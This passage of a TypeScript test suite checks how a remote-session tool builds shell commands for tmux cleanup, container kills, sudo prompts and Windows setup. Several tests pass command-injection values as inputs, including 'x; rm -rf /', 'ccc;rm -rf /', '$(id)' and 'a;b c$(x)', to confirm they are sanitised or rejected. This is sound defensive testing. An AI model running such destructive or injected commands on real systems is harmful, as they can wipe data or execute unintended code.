    // space rather than swallowing the rest of the line.
    expect(settingsWrite!.content).toContain('CCC_TMUX_BIN=/usr/bin/tmux CCC_STATUS_URL_FILE=')
  })

  it('control: no tmux anywhere still bakes an empty CCC_TMUX_BIN (nothing to preserve)', () => {
    const r = runSetupScript({
      env: { TMUX: '/tmp/tmux-1000/default,1234,0' },
      execSync: () => { throw new Error('command -v: not found') },
    })
    expect(sentinelTmuxClass(r.stdout)).toBe('none')
    const settingsWrite = r.writes.find((w) => w.path.includes('settings-sid-rt'))
    expect(settingsWrite).toBeDefined()
    expect(settingsWrite!.content).toContain('CCC_TMUX_BIN= CCC_STATUS_URL_FILE=')
  })

  // ADR-009 token custody: the /status URL carries this session's MCP token, so
  // it must NOT be in the statusLine command (an env-prefix needs a shell, which
  // publishes the whole line — token included — to the remote host's process
  // table). It goes to a 0600 file; only the path is in the command.
  // Mutation to prove this can fail: put the URL back in the env prefix.
  it('writes the status URL to a 0600 exclusive-create file and puts only the PATH in the command', () => {
    const r = runSetupScript({ env: {}, execSync: () => '/usr/bin/tmux\n' })
    const urlWrite = r.writes.find((w) => w.path.includes('ccc-status-sid-rt.url'))
    expect(urlWrite).toBeDefined()
    expect(urlWrite!.content).toContain('/status?cccSessionId=')
    expect(urlWrite!.content).toContain('token=')
    expect(urlWrite!.opts).toMatchObject({ mode: 0o600, flag: 'wx' })
    const settingsWrite = r.writes.find((w) => w.path.includes('settings-sid-rt'))
    expect(settingsWrite!.content).toContain('CCC_STATUS_URL_FILE=')
    // The token never appears in the command itself.
    expect(settingsWrite!.content).not.toContain('CCC_STATUS_URL=')
    const cmd = JSON.parse(settingsWrite!.content).statusLine.command as string
    expect(cmd).not.toContain('token=')
    expect(cmd).toContain('ccc-status-sid-rt.url')
  })
})

// #242 MAJOR: the statusline shim's OSC sentinel would otherwise be
// swallowed by tmux (the pane pty needs allow-passthrough+DCS to forward an
// unrecognised OSC to the client, which is not configured). The shim
// instead bypasses tmux by asking the server for the attached client's tty.
describe('SSH statusline shim -- tmux client-tty bypass (#242)', () => {
  it('embeds a $TMUX branch that asks the tmux server for #{client_tty}', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    expect(script).toContain('process.env.TMUX')
    expect(script).toContain('#{client_tty}')
    expect(script).toContain('display-message')
  })
})

// SSH tmux enhancement (item 4): buildRemoteTmuxKillCommand — the remote
// command run over the SEPARATE end-remote exec. Verified end-to-end on 185.
describe('buildRemoteTmuxKillCommand (item 4)', () => {
  it('kills the ccc-<safeSid> session across every known tmux location and removes both sidecars', () => {
    const cmd = buildRemoteTmuxKillCommand('sess-1')
    // Targets the tmux session name, mirroring buildTmuxLaunchCommand.
    expect(cmd).toContain('kill-session -t ccc-sess-1')
    // Tries PATH + both Homebrew prefixes (macOS non-login exec has a minimal
    // PATH, so `command -v tmux` alone would miss /opt/homebrew/bin) + system +
    // the CCC-staged tier-2 binary.
    expect(cmd).toContain('tmux kill-session -t ccc-sess-1')
    expect(cmd).toContain('/opt/homebrew/bin/tmux kill-session -t ccc-sess-1')
    expect(cmd).toContain('/usr/local/bin/tmux kill-session -t ccc-sess-1')
    expect(cmd).toContain('/usr/bin/tmux kill-session -t ccc-sess-1')
    expect(cmd).toContain('"$HOME/.claude/bin/tmux" kill-session -t ccc-sess-1')
    // Removes the two per-session sidecars.
    expect(cmd).toContain('rm -f ~/.claude/settings-sess-1.json ~/.claude/mcp-sess-1.json')
    // Every step best-effort; the whole exec still exits 0.
    expect(cmd.trim().endsWith('true')).toBe(true)
  })
  it('sanitizes a session id with shell metacharacters into the -t argument', () => {
    const cmd = buildRemoteTmuxKillCommand('a;b c$(x)')
    expect(cmd).toContain('kill-session -t ccc-a_b_c__x_')
    // No raw metacharacter reaches the target token.
    expect(cmd).not.toContain('ccc-a;b')
  })
})

// #572 one hop deeper (live-proven by T20, ssh-statusline-docker.live.ts,
// 2026-08-31): for a CONTAINER runtime the tmux kill only drops the exec
// CLIENT — claude keeps running inside the container. buildContainerKillCommand
// reaches in and kills THIS session's claude, scoped by the settings marker
// already in its argv.
describe('buildContainerKillCommand (#572 in-container orphan)', () => {
  const rootless = { type: 'container', engine: 'podman', container: 'ccc-test' } as const

  it('returns nothing at all for a non-container runtime', () => {
    expect(buildContainerKillCommand('s1', undefined)).toBe('')
    expect(buildContainerKillCommand('s1', { type: 'host' })).toBe('')
  })

  // ADR-009: this runs from endSshRemote OUTSIDE the executor's try, so a
  // TypeError here escaped and skipped ALL remote cleanup — container kill, tmux
  // kill and sidecar sweep alike. A non-string `container` must read as "no
  // name" and return '', not throw.
  // Mutation to prove this can fail: restore `(runtime.container ?? '').trim()`.
  it('a NON-STRING container name returns \'\' instead of throwing out of the End path', () => {
    for (const bad of [42, ['ccc-test'], { n: 1 }, null, true]) {
      expect(buildContainerKillCommand('s1', { type: 'container', container: bad } as never)).toBe('')
    }
  })

  it('rootless podman: engine exec + marker-scoped kill + sidecar removal, exit-0 tail', () => {
    const cmd = buildContainerKillCommand('lv20abc', rootless)
    expect(cmd).toBe(
      "podman exec ccc-test bash -c 'rm -f ~/.claude/settings-lv20abc.json ~/.claude/mcp-lv20abc.json ~/.claude/ccc-status-lv20abc.url 2>/dev/null; exec pkill -f settings-lv20abc' 2>/dev/null; true"
    )
    // No sudo anywhere for a rootless container.
    expect(cmd).not.toContain('sudo')
    // No `-it`: this is a one-shot kill, not an interactive shell.
    expect(cmd).not.toContain('exec -it')
  })

  it('defaults the engine to docker and honours the podman pick (a two-literal choice, never free text)', () => {
    expect(buildContainerKillCommand('s1', { type: 'container', container: 'c1' })).toContain('docker exec c1 ')
    expect(buildContainerKillCommand('s1', { type: 'container', engine: 'docker', container: 'c1' })).toContain('docker exec c1 ')
    expect(buildContainerKillCommand('s1', { type: 'container', engine: 'podman', container: 'c1' })).toContain('podman exec c1 ')
    // An engine value outside the two literals cannot reach the command.
    const hostile = buildContainerKillCommand('s1', { type: 'container', engine: 'x; rm -rf /' as never, container: 'c1' })
    expect(hostile).toContain('docker exec c1 ')
    expect(hostile).not.toContain('rm -rf /')
  })

  // ── THE marker: this is what makes the kill session-scoped ─────────────────

  it('scopes the kill to THIS session by the --settings marker, not to "claude"', () => {
    const cmd = buildContainerKillCommand('lv20abc', rootless)
    expect(cmd).toContain('pkill -f settings-lv20abc')
    // A blunt pkill would end a CO-TENANT session's claude in the same
    // container — the whole point of the marker. Proven live: killing
    // settings-lv20mtgp7kzo left a concurrent settings-lv20mtgpb4zx alive.
    expect(cmd).not.toMatch(/pkill -f claude\b/)
  })

  it('sanitizes a session id with shell metacharacters into the marker (safeSid is the ONLY free value)', () => {
    const cmd = buildContainerKillCommand('a;b c$(x)', rootless)
    expect(cmd).toContain('pkill -f settings-a_b_c__x_')
    expect(cmd).toContain('rm -f ~/.claude/settings-a_b_c__x_.json ~/.claude/mcp-a_b_c__x_.json')
    // Nothing raw survives: no metacharacter, and no way out of the single
    // quotes wrapping the inner script.
    expect(cmd).not.toContain(';b c')
    expect(cmd).not.toContain('$(x)')
    expect(cmd.match(/'/g)).toHaveLength(2)
  })

  it('rejects a container name that fails revalidation instead of interpolating it', () => {
    // The spawn path (composeRuntimeCommand) already throws on these; End
    // revalidates independently in case the stored runtime was ever mutated.
    for (const container of ['', '  ', 'ccc test', 'ccc;rm -rf /', '$(id)', '-ccc', '.ccc', 'a"b', "a'b"]) {
      expect(buildContainerKillCommand('s1', { type: 'container', engine: 'podman', container })).toBe('')
    }
    // The legitimate charset still passes.
    expect(buildContainerKillCommand('s1', { type: 'container', engine: 'podman', container: 'a.b_c-1' })).toContain('podman exec a.b_c-1 ')
  })

  // ── The two live-proven shape rules ────────────────────────────────────────

  it('removes the sidecars BEFORE the pkill, and execs the pkill (or the shell SIGTERMs itself)', () => {
    const cmd = buildContainerKillCommand('lv20abc', rootless)
    const rmAt = cmd.indexOf('rm -f ~/.claude/settings-lv20abc.json')
    const killAt = cmd.indexOf('pkill -f settings-lv20abc')
    expect(rmAt).toBeGreaterThan(-1)
    expect(killAt).toBeGreaterThan(rmAt)
    // `exec` replaces the shell image, so the marker-bearing `bash -c` cmdline
    // is GONE before pkill scans /proc — procps never signals its own pid.
    // Measured on the real container: the naive `pkill; rm; true` ordering
    // exits 143 (self-SIGTERM) with the sidecars left behind.
    expect(cmd).toContain('; exec pkill -f')
  })

  it('rootful (sudo + saved password): forces the prompt to exactly `password:` and KEEPS stderr', () => {
    const cmd = buildContainerKillCommand('lv21abc', { ...rootless, sudo: true }, { hasSudoPassword: true })
    // -S: the ssh exec gets no remote tty, so sudo must read stdin.
    // -p password:: sudo's DEFAULT prompt is "[sudo] password for <user>:",
    // which endSshRemote's tight matcher (/password[:?]\s*$/i) does NOT match.
    expect(cmd).toContain('sudo -S -p password: podman exec ccc-test ')
    // sudo writes that prompt to STDERR — silencing it would hang the End.
    expect(cmd).not.toContain("' 2>/dev/null;")
    expect(cmd.endsWith("'; true")).toBe(true)
  })

  it('rootful with NO saved sudo password: `sudo -n`, which never prompts (no hang, no starved tmux kill)', () => {
    const cmd = buildContainerKillCommand('s1', { ...rootless, sudo: true })
    expect(cmd).toContain('sudo -n podman exec ccc-test ')
    expect(cmd).not.toContain('-S')
    // Nothing will prompt, so stderr noise can go back to /dev/null.
    expect(cmd).toContain("' 2>/dev/null; true")
  })

  it('a sudo flag is never emitted for a rootless container, with or without a saved password', () => {
    expect(buildContainerKillCommand('s1', rootless, { hasSudoPassword: true })).not.toContain('sudo')
    expect(buildContainerKillCommand('s1', { ...rootless, sudo: false }, { hasSudoPassword: true })).not.toContain('sudo')
  })
})

// SSH tmux enhancement (item 3): Windows remote setup — PROTOTYPE. Verified on
// Hyper-V (setup sentinel + statusline shim reaching the client).
describe('generateWindowsRemoteSetupScript (item 3)', () => {
  const NONCE = 'winnonce123'
  it('emits a tmux=none sentinel with the account descriptor (no tmux on Windows)', () => {
    const script = generateWindowsRemoteSetupScript('winsid', { includeStatusLine: true, includeConductorMcp: true }, NONCE)
    expect(script).toContain(`process.stdout.write('setup ok ${NONCE} tmux=none acct='+acctB64+'`)
    // No tmux detection at all (no `command -v tmux`, no accessSync bin probe).
    expect(script).not.toContain('command -v tmux')
    // Reads the account the SAME way the POSIX path does.
    expect(script).toContain("Buffer.from(c.oauthAccount.emailAddress,'utf-8').toString('base64')")
  })
  it('bakes a Windows statusLine command that passes the session id and the status-URL FILE PATH via argv', () => {
    // With the conductor MCP on (mocked port), argv[3] carries the PATH of the
    // status-URL file — never the URL itself (ADR-009 token custody: cmd.exe
    // cannot env-prefix, so the pre-hardening form put the token in the argv of
    // a process the remote respawns every tick, i.e. in its process table).
    // Mutation to prove this can fail: interpolate `statusUrl` back into argv.
    const script = generateWindowsRemoteSetupScript('winsid', { includeStatusLine: true }, NONCE)
    expect(script).toContain(
      `command:'node '+JSON.stringify(shimPath)+' winsid'+' '+JSON.stringify(urlPath)`,
    )
    // The URL (and its token) is written to the sidecar, not the command.
    expect(script).toContain(`fs.writeFileSync(urlPath,"http://127.0.0.1:19333/status?cccSessionId=winsid&token=tok-winsid",{flag:'wx'})`)
    expect(script).not.toContain(`' winsid "http://`)
  })
  it('argv carries only the sid when the conductor MCP is off (no tunnel ⇒ CONOUT$ ladder)', () => {
    const script = generateWindowsRemoteSetupScript('winsid', { includeStatusLine: true, includeConductorMcp: false }, NONCE)
    // `node "<shimPath>" <safeSid>` — shimPath JSON.stringify'd at runtime.
    expect(script).toContain(`command:'node '+JSON.stringify(shimPath)+' winsid'`)
    expect(script).not.toContain('/status?')
  })
  it('rejects a bad nonce (charset guard, fail-closed like the POSIX generator)', () => {
    expect(() => generateWindowsRemoteSetupScript('winsid', undefined, 'bad nonce!')).toThrow(/charset guard/)
  })
})

describe('getWindowsRemoteSetupCommand (item 3 — cmd.exe delivery)', () => {
  // The `$`-free invariant applies to EVERY delivered form: a PowerShell login
  // shell expands any $var inside the double-quoted -Command argument before
  // the child runs, and the earlier `$ProgressPreference=…;$s=…;$s|node` form
  // had $s expanded to empty -> `;|node` ParserError, so setup silently never
  // ran (adversarial review, 2026-08-18). The chunked path's temp file uses a
  // [IO.Path]::GetTempPath() expression for the same reason (not $env:TEMP).
  // Mutation to prove this can fail: reintroduce a `$` anywhere in the output.
  it('with the shared gather the full setup takes the CHUNKED path: every line a $-free powershell -Command under the 8191 limit', () => {
    const cmd = getWindowsRemoteSetupCommand('winsid', { includeStatusLine: true, includeConductorMcp: true }, 'winnonce123')
    expect(cmd).not.toContain('$')
    expect(cmd).not.toContain('-EncodedCommand')
    const lines = cmd.split('\r')
    // Grown past the one-liner ceiling (harmonise-remote slice 2) — the whole
    // point of the chunked path. If this shrinks back under 7500 the one-liner
    // test below covers the shape instead; >1 line asserts we are ON this path.
    expect(lines.length).toBeGreaterThan(1)
    for (const line of lines) {
      expect(line.startsWith('powershell -NoProfile -NonInteractive -Command "')).toBe(true)
      // cmd.exe's hard input limit is 8191 per typed line.
      expect(line.length).toBeLessThan(8191)
    }
    // First line creates the temp file EXCLUSIVELY (ADR-009: -ItemType File
    // fails on an existing path, so a squatted file is never written through);
    // the middle lines append the base64; the final line verifies the digest,
    // runs, and deletes in a `finally`.
    expect(lines[0]).toContain('New-Item -ItemType File -Path ([IO.Path]::GetTempPath()')
    expect(lines[0]).toContain('-ErrorAction Stop')
    expect(lines[1]).toContain('Add-Content -LiteralPath ([IO.Path]::GetTempPath()')
    const last = lines[lines.length - 1]
    expect(last).toContain('FromBase64String')
    expect(last).toContain('|node')
    expect(last).toContain('}finally{Remove-Item -LiteralPath ([IO.Path]::GetTempPath()')
    // Integrity gate over the decoded program, mirroring TMUX_STAGE_SHA256.
    expect(last).toMatch(/SHA256\]::Create\(\)\.ComputeHash/)
    expect(last).toMatch(/-ne '[0-9a-f]{64}'\)\{exit 9\}/)
  })

  // The temp path must not be guessable between runs — a fixed
  // `ccc-setup-<sid>.b64` could be squatted by a co-tenant on a shared Windows
  // host. Mutation to prove this can fail: drop the random component.
  it('gives the chunked temp file a FRESH random component on every call', () => {
    const nameOf = (cmd: string): string => cmd.match(/ccc-setup-winsid-([0-9a-f]+)\.b64/)![1]
    const a = nameOf(getWindowsRemoteSetupCommand('winsid', { includeStatusLine: true }, 'winnonce123'))
    const b = nameOf(getWindowsRemoteSetupCommand('winsid', { includeStatusLine: true }, 'winnonce123'))
    expect(a).toHaveLength(16)
    expect(a).not.toBe(b)
  })

  // No one-liner case: the Windows shim (embedded unconditionally, statusline
  // on or off) has outgrown the 7500 fast-path ceiling since the shared
  // gather, so every real setup ships chunked. The fast path stays as dead-
  // cheap future-proofing, not a tested contract.
})

describe('buildWindowsClaudeCommand (item 3 — cmd.exe launch)', () => {
  it('uses cmd set-syntax env vars and %USERPROFILE% settings/mcp paths', () => {
    const cmd = buildWindowsClaudeCommand({
      sessionId: 'winsid',
      envPrefixVars: ['CLAUDE_CODE_DISABLE_MOUSE_CLICKS=1', 'CLAUDE_CODE_DISABLE_BACKGROUND_TASKS=1'],
      extraFlags: '--effort high',
      continueFlag: '--continue',
    })
    expect(cmd).toContain('set "CLAUDE_CODE_DISABLE_MOUSE_CLICKS=1"&& ')
    expect(cmd).toContain('set "CLAUDE_CODE_DISABLE_BACKGROUND_TASKS=1"&& ')
    expect(cmd).toContain('claude --settings "%USERPROFILE%\\.claude\\settings-winsid.json"')
    expect(cmd).toContain('--mcp-config "%USERPROFILE%\\.claude\\mcp-winsid.json"')
    expect(cmd).toContain('--effort high')
    expect(cmd).toContain('--continue')
    // POSIX `~` never appears (does not expand in cmd.exe).
    expect(cmd).not.toContain('~/.claude')
  })
  it('omits empty flags (no double spaces, no stray --continue on a first connect)', () => {
    const cmd = buildWindowsClaudeCommand({ sessionId: 'winsid', envPrefixVars: [], extraFlags: '', continueFlag: '' })
    expect(cmd).toContain('claude --settings')
    expect(cmd).not.toContain('--continue')
    expect(cmd).not.toContain('  ')
  })
  // #546: the classic-copy/paste mouse vars ride the SAME envPrefixVars array on
  // a Windows remote. Pin that the two specific tokens survive the cmd set-syntax
  // mapping (pure [A-Z_]+=1, no cmd metachar) so a Windows SSH session gets the
  // same xterm-owns-the-mouse launch as POSIX.
  it('maps the #546 classic-copy/paste mouse tokens into cmd set-syntax', () => {
    const cmd = buildWindowsClaudeCommand({
      sessionId: 'winsid',
      envPrefixVars: ['CLAUDE_CODE_DISABLE_MOUSE=1', 'CLAUDE_CODE_DISABLE_ALTERNATE_SCREEN=1'],
      extraFlags: '',
      continueFlag: '',
    })
    expect(cmd).toContain('set "CLAUDE_CODE_DISABLE_MOUSE=1"&& ')
    expect(cmd).toContain('set "CLAUDE_CODE_DISABLE_ALTERNATE_SCREEN=1"&& ')
  })
})
